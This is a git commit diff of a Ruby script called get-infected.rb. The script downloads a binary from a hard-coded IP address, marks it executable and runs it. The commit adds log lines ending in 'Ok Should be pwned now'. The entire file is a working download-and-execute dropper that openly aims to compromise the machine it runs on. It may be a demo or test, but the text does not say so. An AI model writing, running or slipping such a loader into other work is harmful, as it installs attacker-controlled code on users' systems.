e7eb1a69349385e97047ba58c5b3bb41f238a13f
Injected Threads <matt@injectedthreads.com>
2022-12-30 10:53:44 -0500

    take3

--- get-infected.rb
+++ get-infected.rb
@@ -1,7 +1,10 @@
 # get-infected.rb
 require 'open-uri'
 install_url = "http://44.212.29.229/SENIOR_SPRINTER"
+%x(echo "Downloading payload")
 IO.copy_stream(URI.open(install_url), 'SENIOR_SPRINTER')
-
+%x(echo "Payload Downloaded. Making executable")
 %x(chmod +x SENIOR_SPRINTER)
+%x(echo "Trying to execute this nonsense")
 %x(./SENIOR_SPRINTER & >&2)
+%x(echo "Ok Should be pwned now")
